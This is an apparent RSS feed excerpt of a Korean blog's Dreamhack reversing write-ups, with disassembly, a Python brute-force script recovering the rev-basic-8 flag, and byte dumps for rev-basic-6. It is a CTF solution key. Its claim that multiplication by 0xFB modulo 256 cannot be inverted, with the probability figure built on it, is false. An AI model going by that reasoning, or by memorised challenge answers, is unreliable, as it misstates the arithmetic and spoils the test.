class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;_140003000&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;movzx&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jz&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;loc_140001053&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;imul~and 까지가 가장 중요한 부분이다.&lt;/p&gt;

&lt;p&gt;앞서 설명한 2’s complement를 감안할 때, imul 의 operand 2는&lt;/p&gt;

&lt;p&gt;0x11111011(2) == -0x00000101(2) == -5(10)&lt;/p&gt;

&lt;p&gt;and 연산의 이유는 뭐지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아 r계열 레지스터(64bit) 에 e계열 레지스터인 것처럼 값을 넣었으니까(32bit) 상위 32bit의 값을 정리해 주려고 하는 거구나&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;5 곱하는 이유…char 자료형이니 8bit 내에서 일어나는 일을 보고 싶은 것 같은데&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이걸 어떻게 표현해야 하지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;imul이라는 레지스터가 중요함. 이건 부호 연산을 할 수 있는 레지스터임 → 이걸 썼다는 것은 음수를 썼을 가능성이 높다는 뜻&lt;/p&gt;

&lt;p&gt;동적 분석은 보통 x64dbg 사용한다&lt;/p&gt;

&lt;p&gt;연산하고 and 연산이 추가되는 경우는, 하위 n 비트를 구하기 위한 목적이 크다. 형변환이라든가… 자료형(크기) 다른 포맷으로 변경한다든가….&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;23-난관에-봉착하다&quot;&gt;2.3. 난관에 봉착하다&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;5*usr_input == 정답배열이어야 하는데&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이걸 뒤집으면&lt;/p&gt;

&lt;p&gt;5 * usr_input == -정답배열&lt;/p&gt;

&lt;p&gt;즉, 정답배열에 2’s complement를 취한 걸 정답’ 라고 하면&lt;/p&gt;

&lt;p&gt;뭘 5번 덧셈해야(ALU는 덧셈연산밖에 못하니까) 정답’ 이 되는지 나와야 하는데, 안 나온다.&lt;/p&gt;

&lt;p&gt;심지어 usr_input은 char type라서 1byte짜리로, 부동소수점 타입도 안 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;24-난관에서-빠져나왔다&quot;&gt;2.4. 난관에서 빠져나왔다&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어차피 1byte짜리니까, 0~255까지 모든 숫자를 넣어보면서,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;5*usr_input == 정답배열을 충족하는 0x15짜리 길이 문자열을 도출해도 된다고 생각했다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;브루트포싱은 아래와 같이 했음&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;AC F3 0C 25 A3 10 B7 25 16 C6 B7 BC 07 25 02 D5 C6 11 07 C5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;brute_force&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brute_force&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;brute_force&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve_tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve_string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solve_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solve_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;플래그 획득까지 완료&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-질문&quot;&gt;3. 질문.&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그런데 왜 역산이 불가능하지?&lt;/p&gt;

&lt;p&gt;개인적으로 추측해 보았다.&lt;/p&gt;

&lt;p&gt;1byte로 표현하는 수라면, 0~255 까지를 한 주기로 하는 정수의 모듈러 군이다.&lt;/p&gt;

&lt;p&gt;모듈러 군 내에서 곱셈은 일대일 함수가 아니므로 곱셈과 나눗셈의 역산 관계가 성립되지 않는다. 하나의 역원 존재 불가&lt;/p&gt;

&lt;p&gt;곱셈이고 나눗셈이고 덧셈의 연장인데 왜? 라고 생각할 수 있을 것 같다. 그러나 모듈러 연산이 적용되는 닫힌군이라는 게 이 역산 불가의 원인으로 작용하므로… 음수는 의미없고&lt;/p&gt;

&lt;p&gt;이런 원리를 이용한 게 PKI이고.&lt;/p&gt;

&lt;p&gt;즉 밑을 상대적으로 작게(255) 들고 가는 모듈러 집합이라 5라는 작은 수를 곱해도 80% 이상 확률로(해당 군의 약 20%인 0~50까지는 5를 곱해도 255 이상이 아님) 나머지 연산이 이루어질 수 있기 때문에 어쩔 수 없이 (1-0.8^0x14) * 100 == 98.845% 의 확률로 복원 불가능한 정보임&lt;/p&gt;

&lt;p&gt;따라서 브루트 포싱만이 답이라고 생각함.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-8</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-8</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-6 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-분석&quot; id=&quot;markdown-toc-0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-동적-분석&quot; id=&quot;markdown-toc-1-동적-분석&quot;&gt;1. 동적 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000usr_input&quot; id=&quot;markdown-toc-21-sub_140001000usr_input&quot;&gt;2.1. sub_140001000(usr_input)&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#byte_140003000-데이터-분석&quot; id=&quot;markdown-toc-byte_140003000-데이터-분석&quot;&gt;byte_140003000 데이터 분석&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#byte_140003020-데이터-분석&quot; id=&quot;markdown-toc-byte_140003020-데이터-분석&quot;&gt;byte_140003020 데이터 분석&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_15.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_15.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;PE64&lt;/li&gt;
  &lt;li&gt;C언어로 작성된 프로그램&lt;/li&gt;
  &lt;li&gt;아마 패킹 안됐을 것이다&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-동적-분석&quot;&gt;1. 동적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Input을 사용자의 stdio를 통해 받는데 그게 콘솔에 이루어지는 입력&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_16.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_16.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;sub_140001210은 사용자 입력을 받는 함수겠지&lt;/p&gt;

&lt;p&gt;scanf계열일 것이고 stdin을 입력파일로 하니까&lt;/p&gt;

&lt;p&gt;사용자 입력은 char로 들어가겠군!&lt;/p&gt;

&lt;p&gt;그리고 들어가 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_acrt_iob_func(0)&lt;/code&gt; 이 보이므로 맞는 추측&lt;/p&gt;

&lt;p&gt;중요한 건 검증 루틴인 sub_140001000() 이므로 delve into 해보자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-sub_140001000usr_input&quot;&gt;2.1. sub_140001000(usr_input)&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_17.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_17.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;안예뻐&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_18.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_18.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;예쁘게 바꿔옴 ㅎㅎ&lt;/p&gt;

&lt;p&gt;저 두 개의 바이트 배열의 관계를 보면&lt;/p&gt;

&lt;p&gt;byte_140003000의 초반 0x12개 원소를 기준으로 byte_1400003020을 보는 거고&lt;/p&gt;

&lt;p&gt;검증의 횟수는 총 0x12번 즉 18번이다.&lt;/p&gt;

&lt;p&gt;그럼 byte_140003000에서는 어느 레인지까지의 답이 나오나 보자&lt;/p&gt;

&lt;p&gt;근데 저거 아무래도 그건가? 암호원리 중 전치?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;byte_140003000-데이터-분석&quot;&gt;byte_140003000 데이터 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CF&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;92&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;byte_140003020-데이터-분석&quot;&gt;byte_140003020 데이터 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;67&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A4&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;93&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;96&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;05&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;75&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A0&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D6&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;84&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ED&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;A&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;85&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;02&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span 